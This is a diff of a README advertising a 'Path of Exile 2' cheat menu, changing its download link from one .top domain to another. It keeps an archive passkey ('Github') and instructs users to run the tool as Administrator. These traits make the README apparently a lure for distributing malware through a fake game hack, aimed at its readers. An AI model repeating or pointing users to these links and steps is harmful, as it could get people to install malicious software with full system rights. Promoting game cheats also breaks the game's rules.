@@ -6,7 +6,7 @@ Path of Exile 2 external menu with loot filter, map overlay, auto-flask, and mor
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -69,7 +69,7 @@ Based on popular tools like **Exilence Next**, **Awakened PoE Trade**, and **Cus
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Path of Exile 2.
 4. Run the hack **as Administrator**.
